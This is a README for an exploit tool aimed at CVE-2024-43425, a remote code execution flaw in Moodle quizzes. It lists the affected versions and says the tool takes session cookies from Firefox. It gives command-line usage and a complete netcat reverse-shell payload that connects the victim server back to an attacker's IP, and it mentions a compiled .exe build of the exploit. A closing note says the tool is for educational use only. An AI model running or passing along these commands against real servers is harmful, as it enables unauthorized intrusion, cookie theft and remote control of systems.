# CVE-2024-43425

The file `moodleCodeExecutor.py` is a script designed to exploit the CVE-2024-43425 vulnerability in Moodle. This vulnerability allows authenticated remote code execution by manipulating calculated questions in quizzes.

## Key Features
- **Exploited Vulnerability**: CVE-2024-43425.
- **Affected Moodle Versions**: 4.4 to 4.4.1, 4.3 to 4.3.5, 4.2 to 4.2.8, 4.1 to 4.1.11.
- **Language**: Python.
- **Dependencies**: `requests`, `lz4`.

## What it does
1. Extracts session cookies from Firefox.
2. Gets quiz needed info (to be able to execute arbitrary commands).
3. Executing arbitrary commands on the target server.

## How to use:

Usage:
```
python moodleCodeExecutor.py --url `<url>` --courseid `<courseid>` --cmid `<cmid>` --cmd `<cmd>`
```
Usage example:
```
python moodleCodeExecutor.py --url http://127.0.1.1 --courseid 1 --cmid 1 --cmd "whoami"
```

## Instructions to establish a Reverse Shell

This example demonstrates how to establish an interactive reverse connection using Netcat. The payload forces the victim server to connect back to the attacker's IP on the specified port. 

moodle_rce_payload.exe --url http://<MoodleURL or IP> --courseid 1 --cmid 1 --cmd 'rm -f /tmp/naughty_pipe; mkfifo /tmp/naughty_pipe; cat /tmp/naughty_pipe | /bin/sh -i 2>&1 | nc <AttackerIP> 8888 > /tmp/naughty_pipe'

Note: The file moodle_rce_payload.exe is a compiled version of the exploit in the CVE-2024-43425 folder.

## Warning
This script should only be used for educational purposes and in controlled environments with explicit permission. Exploiting vulnerabilities without authorization is illegal and can have severe consequences.
